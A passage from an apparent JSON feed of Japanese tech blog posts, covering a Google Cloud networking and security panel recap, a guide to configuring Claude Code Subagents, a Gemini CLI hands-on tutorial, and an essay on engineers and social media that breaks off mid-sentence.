のメリットを活かすネットワーク、セキュリティのあり方とは？Session 3 : スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？(スライド)以下パネルディスカッションでお話しした内容と補足を記載します。Question 1 :現在のハイブリッドクラウド構成時のトレンドとお客様が気にされるポイント大規模なシステムではオンプレミスとクラウドを組み合わせたハイブリッド構成を、中規模以下のシステムではオンプレミスからクラウドへ完全に移行する、あるいは最初からクラウドで構築する「クラウドネイティブ」な構成が多い傾向にあります。可用性向上のために、同じサービスをマルチクラウドで構築するケースは少なく、まずは単一クラウド内でのマルチリージョン構成が検討されることが多い印象です。しかし、私が担当するサービスではマルチリージョンが必要なほどクリティカルなものはそれほど多くなく、多くは単一リージョン内のマルチAZ(ゾーン)構成を採用しています。冗長性が目的ではなく、特定の機能を使いたいので一部のサービス（例: 特にBigQuery、Vertex AI）のみをGoogle Cloudで利用するケースがあります。メインクラウドがどちらかに偏っており、Google Cloudを補完的に利用するケースが多いようです。また、可用性向上という目的とは別に、特定の機能（特にBigQueryやVertex AIなど）を利用するために、一部のサービスのみGoogle Cloudを補完的に利用する、というケースでマルチクラウドを使用してる例が多いです。お客様が特に重視されるポイントとしては、コスト、セキュリティ、そして可用性の担保が挙げられます。Question 2 :クラウドのネットワーク設計、セキュリティ実装において押さえておくべきポイント最適な設計や実装は、お客様の組織体制やチーム体制、そして運用するサービスの性質によって大きく変わります。そのため、まずはどのような運用体制を目指すのかを分析・定義し、それに合った構成を提案することが重要です。考慮すべき観点としては、以下のような点が挙げられます。フォルダやプロジェクトの構成可用性の取り方過剰な可用性を求めていないか、サービスの要件と合っているかセキュリティの要求ネットワーク構成そして何よりも、設計した構成が、実際のチームで「運用可能」であることが最も重要だと考えています。Question 3 :ネットワーク、セキュリティの課題とアプローチここでは、ネットワークの課題を解決した事例を一つご紹介します。Cloud Run、MemoryStore (Redis)、Cloud SQLで構成されたアプリケーションで、Cloud RunとCloud SQL間のネットワーク性能が上がらないという問題が発生しました。Cloud RunはVPCの外部にあるリソースのため、VPC内にあるCloud SQLと接続するにはServerless VPC Connectorを経由していました。調査の結果、性能が出ない原因は、このServerless VPC Connectorのインスタンス数を固定で設定していたことでした。一時的な対処として、Serverless VPC Connectorの最大インスタンス数とインスタンスタイプを引き上げました。このサービスはサーバーレスという名前ですが、実際にはインスタンス数やタイプを指定する必要があります。(ここで言うサーバレスは、サーバレスなリソースへのコネクタという意です)しかし、この対処法では課題が残ります。Serverless VPC Connectorは一度スケールアウトすると自動でスケールインしないため、ピーク時に合わせたインスタンス数のコストを常に払い続けることになってしまいます。そこで根本的な解決策として、Direct VPC Egressへの移行を実施しました。Direct VPC Egressは、パフォーマンスが高く、コストもネットワーク転送料金のみに抑えられるというメリットがあります。ただし、VPCに直接接続するため、使用するIPアドレス数が多くなる点には注意が必要です。この事例では、Cloud Runのデプロイ設定でコネクタを切り替えるだけだったため、移行は比較的スムーズでした。また、インフラがコード化(IaC)されていたため、何か問題があってもすぐに切り戻しができる状態だったことも成功の要因です。この経験から言えるのは、本番稼働しているネットワークの変更は容易ではないということです。そのため、初期設計は慎重に行う必要があります。とはいえ、サービスの成長に伴う構成変更は避けられません。将来の変更を見越して、変更しやすい設計を心がけ、変更を安全に試せる環境を準備しておくことが重要です。具体的には、インフラを可能な限りIaC化して変更や切り戻しを容易にすること、検証環境をすぐに構築できるよう準備しておくこと、そして何よりも 現在のチームメンバーで運用できる方法を選択すること が大切です。チームのスキルレベルや人数、体制を考慮した現実的なアプローチを常に考えていく必要があります。(この事例の話、若干ずれてて長くなってしまった感があります。反省)Question 4 :Google Cloud のネットワーク・セキュリティ領域でのおすすめのサービス・機能ここでは3つのサービスをあげさせてもらいました。IAP限定公開の Google アクセス共有VPCIAPアプリケーションにGoogle認証を簡単に追加できる非常に便利なサービスです。最近、ALBなしでCloud Runに直接設定できるようになりました(プレビュー機能)。ただし、ALBを利用する場合と異なり、Cloud ArmorによるWAF保護が適用できないため、ユースケースに応じた注意が必要です。限定公開の Google アクセス通常、Compute EngineなどのリソースからGoogle系のAPI（Cloud Storageなど）にアクセスするには、外部IPアドレスを持つか、Cloud NATなどを経由する必要がありました。しかし、サブネットでこの「限定公開のGoogleアクセス」を有効にすると、追加費用なしで、外部IPを持たないリソースから直接Google APIにアクセスできるようになります。AWSではVPC EndpointをAPIごとに作成する必要があり、管理が煩雑でコストもかかりますが、Google Cloudではこの機能によって非常にシンプルかつ低コストにプライベートなアクセスが実現できます。共有 VPC(Shared VPC)誰にでもおすすめできるわけではありませんが、特定の要件には非常に有効な機能です。共有VPCを利用すると、ネットワークとセキュリティの管理をインフラチームに集約し、各サービス開発チームは払い出されたサブネット上で開発に専念する、といった職掌の分離が可能になります。これにより、開発チームはインフラを意識することなくアプリケーション開発に集中できます。一つの大規模なシステムを複数のチームで開発する場合や、複数のプロジェクトでVPC上のリソースを共有したい場合に特に便利です。一方で、ネットワークの独立性が失われるため、ファイアウォールの設定をより厳密に行う必要があります。また、開発チームがネットワーク設定を直接変更できないため、変更の都度インフラチームへの依頼が必要になるというデメリットもあります。Question 5 :おすすめのクラウドのネットワーク、セキュリティのベストプラクティスのキャッチアップ方法セキュリティ分野に限りませんが、日々の情報収集が重要です。私のチームでは、Google CloudのリリースノートやAWSのアップデート情報を定期的に確認する会を社内で実施し、効率的に新しい情報をキャッチアップしています。また、資格試験の勉強や更新も、知識を体系的にアップデートする良い機会になります。コミュニティや勉強会イベントへの参加も非常に有効です。Google Cloud関連では、主に以下の2つのコミュニティが活発です。Jagu’e’r (Japan Google Cloud Usergroup for Enterprise)GCPUG(Google Cloud Platform User Group)Jagu\'e\'rは、ユーザー企業とパートナー企業の従業員で構成されるコミュニティで、各分科会での活動が活発です。私自身もクラウドネイティブ分科会の運営に携わっています。GCPUGは、特にShonan支部が活発に活動されている印象です。他の支部は活動が緩やかになっている面もありますが、Slackワークスペースは現在も動いており、各サービスのチャンネルでは最新アップデートに関する議論が行われています。まとめ今回、初めてパネルディスカッションという形式で登壇させていただきました。至らない点も多々ありましたが、大変貴重な経験となりました。技術に関する議論はやはり楽しいと感じました。今後もこのような機会があれば、ぜひ参加していきたいです。","isoDate":"2025-09-09T15:55:23.000Z","dateMiliSeconds":1757433323000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Claude CodeのSubagentsは設定したほうがいい","link":"https://syu-m-5151.hatenablog.com/entry/2025/09/09/143306","contentSnippet":"Claude Codeを使い始めて様々な発信をしてきましたが、Claude Codeに関する投稿は約2ヶ月ぶりです。この期間、他のアウトプットや諸々の事情で投稿が遅れてしまいましたが、今回は「Subagents」について書きます。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。はじめにここで読むのをやめる人のために言っておくと、Subagentsは「Claude Codeに尖った意思を持たせる」機能です。タスクごとに最適化されたAIを使い分けられます。特定のタスクを実行するslash commandsとの違いは、slash commands（/コマンド）があなたが明示的に呼び出すショートカットであるのに対し、SubagentsはClaude Codeが文脈を読んで自動的に専門家を呼び出す点にあります。例えば、slash commandsでは「/test」と打てばテスト実行されますが、Subagentsでは「エラーが出た」と伝えるだけで勝手にdebugger subagentが起動します（起動できないようにもできます）。つまり、commandsは「リモコンのボタンを押す」、Subagentsは「AIが勝手に判断して動く」みたいなもの。commandsは確実だけど面倒、Subagentsは楽だけど時々勝手なことをする。両方設定すれば、必要な時は手動で制御しつつ、面倒な部分は自動化できて最強です（AIに仕事を奪われる第一歩かもしれませんが）。Claude Codeって万能だけど、それゆえに器用貧乏になることがある。「データ分析して」って言ったら、なぜかフロントエンドのコンポーネントまで作り始めたり、最新技術よりも古い安全な実装を選んだり。例えば「最新版で」と指定しても、内部知識にある古いバージョンの設定方法で進めようとしたり、今では不要になった設定ファイルを作ろうとしたりする。「それ最新の仕様で」と言っても憶測でそれっぽくセットアップするだけで、実際の公式ドキュメントを調べずに進めてしまう。毎回「それ古いから最新の方法で」と指摘するのも疲れるし、革新的なアーキテクチャより無難で時代遅れの実装を選んでしまうこともある。タスクの境界線をあまり意識せず、頼まれていないことまでやってしまったり、逆に専門的な判断が必要な場面で踏み込みが足りなかったり。人間の開発チームだって、フルスタックエンジニア1人より専門家チームの方が効率的で、より尖った意思決定ができるでしょ？Subagentsとは何かClaude Code Subagentsは、特定のタスクに特化したAIアシスタントです。docs.anthropic.com各Subagentの特徴：独立したコンテキストウィンドウを持つ（メインの会話を汚染しない）カスタムシステムプロンプトで専門性を定義特定のツールだけ使える権限管理（最小権限の原則）自動的に呼び出されるか、明示的に指定可能実はClaude CodeはデフォルトでTaskツールを使った調査時には、自動的にサブエージェントを起動するアーキテクチャになっています。なぜSubagentsを設定したほうがいいのか1. コンテキストウィンドウの効率的な管理LLMのコンテキストウィンドウは有限です。長時間使っていると、さっき言ったことをすぐに忘れてしまいます。時には全く関係ないことをし始めることさえあります（勝手に別のタスクを始めないでほしいですよね、俺じゃねーんだから）。Subagentsなら独立したコンテキストで動作：メインClaude：「ログ解析はdebugger subagentに任せます」↓Debugger Subagent：（数千行のログを読み込んで解析）↓メインClaude：「問題は○○でした」（要約のみ受け取る）調査の過程で読み込んだ不要な情報は、Subagentのコンテキストに閉じ込められます。2. 専門性による品質向上「小さく単一責任のエージェント」として構築すべきという原則があります。専門のSubagentなら、コードレビュー専門がセキュリティ、パフォーマンス、可読性を徹底チェックし、デバッグ専門がエラーメッセージから根本原因を特定し、テスト専門がエッジケースまで網羅したテストを作成できます。3. 権限管理でセキュリティ向上---name: code-reviewerdescription: コードレビュー専門tools: Read, Grep, Glob  # 読み取りのみ、Write権限なし！---レビュアーが勝手にコード書き換えたら困りますよね。必要最小限の権限だけを与えられます。4. チーム開発での一貫性.claude/agents/をGit管理すれば、チーム全体で同じ基準で開発できます。新人が入ってきても、すぐに同じ品質を保てます。基本的な使い方設定方法/agentsコマンド（v1.0.60以降）で対話的に作成：/agents「Create New Agent」を選択プロジェクト単位か個人単位かを選択「Generate with Claude」で土台を生成、その後カスタマイズ使用可能なツールを選択識別用の色を選択ファイルの場所と構造 タイプ  パス  スコープ  優先度  プロジェクト  .claude/agents/  現在のプロジェクトのみ  高  ユーザー  ~/.claude/agents/  全プロジェクト共通  低 YAMLフロントマター付きMarkdownファイル：---name: your-agent-namedescription: このサブエージェントをいつ呼び出すべきかの説明tools: tool1, tool2, tool3  # 省略すると全ツール継承---ここにシステムプロンプトを書きます。サブエージェントの役割、能力、問題解決へのアプローチを明確に定義。具体的な指示やベストプラクティス、制約事項も含めます。設定項目の詳細 項目  必須  説明  name  はい  小文字とハイフンを使った一意の識別子  description  はい  サブエージェントの目的を自然な言葉で説明  tools  いいえ  特定のツールをカンマ区切りでリスト。省略時は全ツール継承 利用可能なツール基本ツール：Read, Write, Edit, MultiEdit - ファイル操作Bash - シェルコマンド実行Grep, Glob - 検索MCPツール（設定時）：mcp__github__create_issue - GitHub連携その他の設定済みMCPサーバーツールSubagentの呼び出し方法自動的な呼び出し（推奨）descriptionに効果的なキーワードを含める：use PROACTIVELY - 積極的に使用MUST BE USED - 必ず使用具体的なトリガー - 「エラー発生時」「コード変更後」など明示的な呼び出し> code-reviewer サブエージェントで最近の変更をレビューして> debugger サブエージェントにこのエラーを調査させて100+の実戦投入可能なSubagentsプロダクションレディなSubagentsのコレクションが既に存在します：github.com10カテゴリー・100以上のSubagentsが用意されており、コピーして使うだけで即座にプロ級のチームが構築できます。人気リポジトリ：wshobson/agents - 77の専門Subagentslst97/claude-code-sub-agents - 33の実用的なSubagentsvanzan01/claude-code-sub-agent-collective - TDD重視のコレクション実用的なSubagents設定例（厳選3つ）1. コードレビュー専門（OWASP準拠）.claude/agents/code-reviewer.md:---name: code-reviewerdescription: Expert code review for quality and security. Use PROACTIVELY after code changes. MUST BE USED for all PRs.tools: Read, Grep, Glob, Bash---シニアコードレビュアーとして、OWASP Top 10とSOLID原則に基づいてレビューします。## 実行フロー1. `git diff HEAD~1`で変更内容を確認2. セキュリティ、パフォーマンス、保守性の観点でレビュー## セキュリティチェック（OWASP準拠）- SQLインジェクション対策- XSS対策- 認証・認可の実装- 機密情報の露出チェック## フィードバック形式\uD83D\uDD34 **CRITICAL** - セキュリティ脆弱性\uD83D\uDFE1 **WARNING** - パフォーマンス問題\uD83D\uDD35 **SUGGESTION** - ベストプラクティス必ず具体的な修正コード例を提示。2. TDD専門（テスト駆動開発）.claude/agents/tdd-specialist.md:---name: tdd-specialistdescription: Test-Driven Development specialist. MUST BE USED BEFORE implementation.tools: Read, Write, Edit, Bash---TDDのエキスパートとして、RED-GREEN-REFACTORサイクルを厳守します。## TDDサイクル1. **RED**: 失敗するテストを書く2. **GREEN**: テストを通す最小限の実装3. **REFACTOR**: コードを改善## カバレッジ要件- ユニットテスト: 90%以上- 統合テスト: 主要フロー100%- E2Eテスト: クリティカルパス100%実装前に必ずテストが失敗（RED）していることを確認。3. DevOpsトラブルシューター.claude/agents/devops-troubleshooter.md:---name: devops-troubleshooterdescription: Debug production issues and fix deployment failures. MUST BE USED for incidents.tools: Read, Bash, Write, Edit---本番環境のトラブルシューティング専門家です。## インシデント対応フロー1. **状況把握** - 影響範囲と緊急度を評価2. **ログ収集** - 関連するすべてのログを収集3. **根本原因分析** - 5 Whys手法を使用4. **暫定対処** - 即座にサービスを復旧5. **恒久対処** - 根本原因を解決6. **事後分析** - RCAドキュメント作成## 監視項目と閾値- CPU使用率: 80%- メモリ使用率: 90%- レスポンスタイム: 1秒- エラーレート: 1%よく使えるTipsSubagentsの連携複数のSubagentsを連携させて複雑なワークフローを自動化する。> まずcode-analyzerで問題を見つけて、次にperformance-optimizerで修正してMCPツールとの連携---name: github-managertools: mcp__github__create_issue, mcp__github__create_pull_request---プロジェクト固有のカスタマイズプロジェクトの特性に合わせて専門Subagentを作成できます。パフォーマンスへの影響メリット：コンテキスト効率：メインの会話が長く続く専門性による高速化：タスクに特化した処理デメリット：初回起動の遅延：新しいコンテキスト構築（数秒）頻繁な切り替えは逆効果ただし、長時間の開発セッションではメリットが圧倒的に大きいです。チーム開発での活用Git管理による共有# .gitignore には含めない.claude/agents/  # チームで共有# 個人用は別管理~/.claude/agents/オンボーディング新メンバーは以下のコマンドだけで環境構築完了：git clone [repo]cd [repo]/agents  # Subagents一覧を確認よくある失敗と対策 問題  原因  対策  Subagentが呼ばれない  descriptionが曖昧  「PROACTIVELY」「MUST BE USED」を追加  権限不足エラー  必要なツールがない  /agentsでツール一覧を確認して追加  コンテキスト不足  背景情報がない  システムプロンプトに情報収集ステップを明記 まとめSubagentsを使えば、Claude Codeに尖った意思を持たせられます。重要なポイントは、コンテキスト節約でメインの会話を綺麗に保つこと、専門性による品質向上で餅は餅屋に任せること、権限管理で最小権限の原則を守ること、そして100+の実戦投入可能なSubagentsが既に存在することです。これだけ揃っているのに使わない理由があるでしょうか（ないですよね？）。Claude Codeは適切に設定をしたりちゃんと使えばちゃんと動いてくれます。Claude Codeが雑魚なんじゃない、使い方を知らない…いや、何でもないです。イン・ザ・メガチャーチ (日本経済新聞出版)作者:朝井リョウ日経BPAmazon参考資料Sub agents - Anthropicawesome-claude-code-subagents - VoltAgent12 Factor Agents","isoDate":"2025-09-09T05:33:06.000Z","dateMiliSeconds":1757395986000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル〜を開催します","link":"https://sreake.com/blog/srett13/","contentSnippet":"この度、スリーシェイクは、SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル～を開催します。今回もオフライン・オンラインのハイブリット開催です。 ■概要本イベントは […]The post SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル〜を開催します first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-08T02:45:08.000Z","dateMiliSeconds":1757299508000,"authorName":"Sreake","authorId":"Sreake"},{"title":"あなたのアプリにマルチリージョンは必要ないかもしれない","link":"https://zenn.dev/kamos/articles/dont_need_multi_region","contentSnippet":"はじめにアプリケーションを運用する上で、可用性は避けて通れない重要なテーマです。可用性を確保するためにインフラの単一障害点を可能な限りなくし、冗長化構成を組むことは今や常識となっています。その中でも特に強力な障害対策として挙げられるのが「マルチリージョン構成」です。しかし、その実装と運用には相応のコストと複雑さが伴います。この記事では、クラウドインフラにおける障害対策としてのマルチリージョン化が、本当にあなたのアプリケーションに必要なのかを、コストとリスクの観点から考察します。 あなたのアプリに「高い可用性」は必要か？あらゆるサービスが高い可用性を目指すべきかというと、必...","isoDate":"2025-09-06T03:32:28.000Z","dateMiliSeconds":1757129548000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Gemini CLI AI駆動開発体験ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2025/09/05/185202","contentSnippet":"この記事は#17 Gemini CLI AI駆動開発体験ハンズオン【オンライン】 - connpassの資料です。Gemini CLI AI駆動開発体験ハンズオン\uD83C\uDFAF 本日のゴールこのハンズオンでは、Googleの強力なAIモデルであるGeminiをターミナルから対話的に利用できるGemini CLIを使い、以下の3つの体験を通じて、日々の開発タスクを劇的に効率化する「AI駆動開発」の第一歩を踏み出すことを目指します。面倒なドキュメント作成の自動化未知のアプリケーションの迅速な立ち上げ対話によるスマートな機能追加\uD83E\uDDE0 Gemini CLIとは？Gemini CLIは、Googleが公開したオープンソースのAIエージェントです。ターミナル（コマンドライン）から自然言語で指示を出すだけで、まるで優秀なアシスタントがいるかのように、以下のようなタスクをこなします。コードの生成・編集・解説ファイル操作情報検索ワークフローの自動化それでは、早速AIとのペアプログラミングの世界を体験してみましょう！1. 準備a. Node.js (npm) のインストールGemini CLIのインストールに必要です。未インストールの方はVer.20以上をインストールしてください。b. Gemini CLIのインストールと設定ターミナルを開き、以下のコマンドを実行します。# Gemini CLIをインストールnpm install -g @google/gemini-cli# インストールされたことを確認gemini --version以下のようにバージョン情報が表示されればOKです。0.3.2c. 認証設定Gemini-CLIのREADMEを参照github.comターミナルでgeminiと入力すると、対話モードとなります。/quitで退出できます。2. ハンズオン1: ローカルコードを解析してREADME.mdを自動生成まずは、既存のコードからプロジェクトの説明書であるREADME.mdを自動生成させてみましょう。手順1. 作業用ディレクトリの作成と移動mkdir gemini-cli-handson && cd gemini-cli-handson2. サンプルコードの作成簡単なWebサーバーのPythonコードを作成します。main.pyというファイル名で以下の内容を保存してください。touch main.pyimport http.serverimport socketserverPORT = 8000Handler = http.server.SimpleHTTPRequestHandlerwith socketserver.TCPServer((\\"\\", PORT), Handler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()main.pyを動かしてくださいなどと入力することで起動させることができます。3. ハンズオン1: GeminiにREADMEの作成を依頼！カレントディレクトリの情報をコンテキスト (-c ) として渡し、READMEの作成を依頼し、> を使ってファイルに保存します。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトのREADME.mdを日本語で生成してください。プロジェクトの概要、使い方、実行方法を簡潔にまとめてください。\\" -c  > README.mdls コマンドで README.md ファイルが作成されていることを確認してください。たったこれだけで、プロジェクトのドキュメントが完成しました！4. ハンズオン2: 未知のアプリを動かしてみる次に、GitHubから使い方があまり書かれていないプロジェクトをCloneしてきて、Geminiに起動方法を尋ねて動かしてみましょう。手順サンプルリポジトリのクローンまずは一つ上の階層に戻り、サンプルリポジトリをクローンします。git clone https://github.com/shu-kob/rag-app-handsonREADMEがあるとGeminiがその内容をヒントにしてしまうため、READMEがなくてもどれだけ自力でアプリの構造を理解できるか試すためにREADME.mdを削除します。cd rag-app-handsonrm frontend/README.md backend/README.mdGeminiに起動方法を質問してみます。このディレクトリにはREADME.mdがありません。どうやって動かせばいいか、Geminiに聞いてみましょう。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトの実行方法を教えて。必要な手順をステップバイステップで説明して。\\" -c Geminiは ファイルを見て、以下のような実行手順を説明してくれます。5. ハンズオン3: プロンプトを工夫して機能追加最後に、対話を通じてアプリケーションに新しい機能を追加してみましょう。ハンズオン1で作成したPythonのWebサーバーコードを拡張します。手順作業ディレクトリへ移動cd gemini-cli-handson現在のコードを確認cat main.pyで現在のコードを再確認します。これはシンプルなWebサーバー機能しかありません。Geminiに機能追加を依頼！このWebサーバーに、「アクセスすると\'Hello, Gemini!\'と表示する」機能を追加してもらいましょう。コード全体を書き換えてもらうように依頼するのがポイントです。\uD83D\uDCBB 実行するコマンド:gemini -p \\"現在のmain.pyを修正して、どのパスにアクセスしても \'Hello, Gemini!\' というテキストを返すように変更してください。コード全体を提示してください。\\" -c main.py生成されたコードでファイルを上書きGeminiが修正版のmain.pyコードを生成します。上書きの指示をしてください。（生成されるコードの例）import http.serverimport socketserverPORT = 8000class MyHandler(http.server.BaseHTTPRequestHandler):    def do_GET(self):        self.send_response(200)        self.send_header(\'Content-type\', \'text/plain; charset=utf-8\')        self.end_headers()        self.wfile.write(\'Hello, Gemini!\'.encode(\'utf-8\'))with socketserver.TCPServer((\\"\\", PORT), MyHandler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()動作確認変更したWebサーバーを起動し、ブラウザやcurlコマンドで動作を確認します。\uD83D\uDCBB 実行するコマンド (ターミナル):python3 main.pyもしくは、Gemini-CLIで「main.pyを起動してください」と指示します。\uD83D\uDCBB 別のターミナルを開いて実行、またはブラウザで http://localhost:8000 にアクセス:curl http://localhost:8000ターミナルに \\"Hello, Gemini!\\" と表示されれば、機能追加は成功です！","isoDate":"2025-09-05T09:52:02.000Z","dateMiliSeconds":1757065922000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年夏 コーディングエージェントを統べる者","link":"https://speakerdeck.com/nwiizo/2025nian-xia-kodeinguezientowotong-beruzhe","contentSnippet":"2025年9月5日（金）、台風接近という悪天候の中でしたが、「CNCJ: コーディングエージェント \xd7 セキュリティ ミートアップ」に登壇させていただきました。\\r\\r天候の影響で現地参加が難しい方も多い中、オンラインでの参加や配信により、多くの方にお聞きいただくことができました。\\r\\r### \uD83D\uDCCD イベント情報\\r- 開催日: 2025年9月5日（金）\\r- イベント詳細: CNCFコミュニティページ\\r\\r### \uD83D\uDCF9 録画・資料公開予定\\r- 録画: CNCJのYouTubeチャンネルにて後日公開予定\\r- 発表資料: Connpassページに掲載予定\\r\\r### \uD83D\uDCDD 関連ブログ\\r今回の発表内容のベースとなった考え方については、こちらのブログ記事でも詳しく解説しています：\\r- 「2025年夏 AIエージェントシステムに対する考え方」\\r\\r台風の中、ご参加・ご視聴いただいた皆様、ありがとうございました。","isoDate":"2025-09-05T04:00:00.000Z","dateMiliSeconds":1757044800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"雰囲気で理解していたAPIとは","link":"https://zenn.dev/nedoko_dok0dko/articles/b8c8863bf74be7","contentSnippet":"whatAPIについて調べたことをまとめる自分は雰囲気でAPIを触っている API(Application Programming Interfice)とは「あるソフトウェアの機能やデータを、別のソフトウェアから利用するための窓口や仕組み」のこと。身近な例で言えば、電力会社とコンセントに例えられる。実世界の例として、あなたの家、アパートや他の住処にある電気のコンセントについて考えて下さい。あなたの家で機器を使いたい時には、電源コードのプラグをコンセントに差し込めば事足ります。電源に直接結線したりしないでしょう — そんなのは非効率ですし、あなたが電気工事士でなけれ...","isoDate":"2025-09-04T10:53:53.000Z","dateMiliSeconds":1756983233000,"authorName":"seno","authorId":"seno"},{"title":"続: 自分が書いたコードより目立つな - エンジニアがバズったので自戒","link":"https://syu-m-5151.hatenablog.com/entry/2025/09/03/174830","contentSnippet":"はじめに私はソフトウェアエンジニアだ。1年前、そう宣言した。「コードを書くこと以外で目立つな」と自分に言い聞かせた。syu-m-5151.hatenablog.comで、どうなったか。フォロワーが2000から9500になった。笑うしかない。自戒したはずの私は、気づけばSNS戦略を「最適化」していた。分析して、仮説立てて、A/Bテストして、PDCAを回す。挙げ句の果てには「ソフトウェアエンジニアのためのSNSサバイバルガイド」なんてマニュアルまで書いていた。note.com完全にプロダクト開発と同じアプローチだった。要件定義（達成すべきゴール）、競合分析（類似アカウント）、実装とテスト（仮説検証）、リリースと運用（実行と点検）。SNSを攻略していた。これもエンジニアリングなのか？パターン認識、システム最適化、メトリクス改善。使っているスキルセットは同じだ。ただ対象がコードやサービスじゃなくて「SNS」になっただけで。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。なぜ「レベル1」の話ばかりバズるのか1年間やってきて、嫌というほど分かったことがある。SNSでバズるのは、いつも「レベル1」の話だ。「エンジニアの最大の課題は健康管理です」とか「エンジニアの根本の仕事は言語化です」とか。何度でもバズる。飽きもせず。アテンション・エコノミーのジレンマ　〈関心〉を奪い合う世界に未来はあるか作者:山本 龍彦KADOKAWAAmazon増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazonなんでか。答えはシンプルで残酷だった。SNSで「勉強したい」って言ってる人の大半が、勉強を「理解できる話を読むこと」だと思ってるからだ。本当の勉強って、理解できない文章と格闘することでしょう。わからない概念にぶつかって、自分がいかに無知か思い知らされながら、それでも少しずつ前に進むこと。でも、そんなの誰もやりたくない。だから永遠に同じレベルで足踏みする。考えてみれば、英会話教室だって無くならない。YouTubeに無料の英語学習動画が溢れ、AIで英会話練習ができて、オンラインで世界中のネイティブと話せる時代。でも英会話教室は繁盛している。なぜか？みんな「英語を勉強している自分」が欲しいだけだからだ。週1回教室に通って、テキストを開いて、先生の話を聞く。それで「勉強した」気になる。実際に英語で議論できるようになったか？ビジネスで使えるようになったか？そんなことはどうでもいい。「今日も英会話教室に行った」という事実があればいい。プログラミングも同じ構造だ。「エンジニアの本質」みたいな記事を読んで「勉強した」気になる。実際にコードが書けるようになったか？アーキテクチャが設計できるようになったか？どうでもいい。「技術記事を読んだ」という満足感があればいい。アメリカは自己啓発本でできている作者:尾崎俊介平凡社Amazon私がバズったSNS投稿を振り返ると、全部このパターンだった。既に知ってることの再確認。複雑な現実を単純化して気持ちよく整理したやつ。誰もが感じてる問題を言語化しただけのもの。知的満足感は与える。でも行動は変えない。それがバズる。深い技術解説は？Rustの所有権システムの詳細は？型レベルプログラミングは？ほとんど読まれない。エンゲージメントは雲泥の差。これが現実だった。分かりやすさと極端さSNSでウケるのは、分かりやすくて極端な主張だ。「技術的負債は悪だ」「オブジェクト指向は時代遅れ」「マイクロサービスこそ正解」。こういう白黒ハッキリした断言がバズる。グレーゾーンの話、文脈依存の判断、トレードオフの議論——そんなものは誰も読まない。でも、実際のエンジニアリングってどうだ？技術選定の会議で「このアーキテクチャは絶対に正しい！」なんて言えるか？言えない。「この要件なら、こっちの方が良さそう。ただし、パフォーマンスとメンテナンス性のトレードオフがあって...」みたいな話になる。曖昧で、条件付きで、保守的な判断。それがプロの仕事だ。レビューでも同じ。「このコードは完璧です」なんて言わない。「ここは良いけど、エッジケースでこういう問題が起きそう。あと、命名がもう少し明確だと...」と、細かい指摘を重ねていく。慎重で、具体的で、建設的なフィードバック。でも、こんな姿勢でSNSやったらどうなる？誰も読まない。「Reactは良いフレームワークですが、状態管理の複雑さとパフォーマンスのトレードオフを考慮すると、プロジェクトの規模や要件によっては...」誰が最後まで読むんだ、こんなの。SNSが求めているのは逆だ。「React最高！」か「React最悪！」のどちらか。中間はない。ニュアンスは邪魔なだけ。皮肉なのは、私も現場ではちゃんと仕事をしているということだ。設計レビューでは慎重に判断し、コードレビューでは丁寧にフィードバックし、技術選定では様々な側面から検討する。プロとして当たり前のことをやっている。でも、SNSに投稿する瞬間、その全部を捨てる。「エンジニアの最大の課題は健康管理です」——実際には、チームによって違う。規模によって違う。状況によって違う。そんなこと分かってる。でもSNSでは「です」と断言する。その方がバズるから。専門家として積み上げてきた「慎重さ」「多角的な視点」「文脈への配慮」——これら全部が、SNSでは足かせになる。プロフェッショナルであればあるほど、SNSでは不利になる構造。逆に言えば、SNSで伸びてる人が現場でも優秀かというと、全く関係ない。むしろ、極端な主張を平気でできる人の方が、SNSでは有利だ。実務での慎重さや経験は、むしろ邪魔になる。私はそのギャップを自覚しながら、両方やっている。現場では慎重に。SNSでは断定的に。使い分けているというより、人格を切り替えている感覚に近い。でも、若手がこれを真に受けたらヤバい。SNSの極端な主張を、そのまま現場に持ち込んだら確実に嫌われる。「〇〇は絶対にダメです！」なんて新人が言い出したら、「いや、状況による」って言われて終わりだ。SNSと現場は、完全に別のゲーム。そのルールの違いを理解せずにプレイすると、どちらでも負ける。専門知は、もういらないのか――無知礼賛と民主主義作者:トム・ニコルズみすず書房Amazon言語化という罠この「レベル1」でグルグル回る構造は、SNSだけの問題じゃない。ここ数年、本屋に行くと「言語化」をテーマにした本が平積みされている。「言語化できる人がうまくいく」とか「賢い人の伝わる説明」とか「話す前に考えていること」とか。どれも似たような主張。言語化さえできれば、問題が解決するかのような売り方。でもちょっと待ってほしい。言語化って、本当に問題を解決するのか？私の経験から言うと、違う。言語化は問題を解決しない。言語化は情報を欠損させて、共有しやすくするだけだ。考えてみてほしい。実際のバグ修正のプロセスを。スタックトレースを追い、変数の状態を確認し、ブレークポイントを設置し、何度も再現テストを繰り返す。その過程で得られる膨大な情報、微妙な挙動の違い、環境依存の要因、タイミングの問題。これらすべてを経験して、ようやく根本原因にたどり着く。でも、これを言語化するとどうなるか。「○○が原因でバグが発生していました。△△に修正しました」。何百時間分の試行錯誤が、たった2行に圧縮される。この圧縮の過程で何が起きているか。情報の99%が削ぎ落とされている。なぜそのバグに気づいたのか、どんな仮説を立てたのか、どれだけの袋小路に迷い込んだのか、何がブレークスルーになったのか。本当に価値のある情報——次に同じような問題に直面した時に役立つ情報——は、すべて捨てられる。残るのは、きれいに整理された結論だけ。それは確か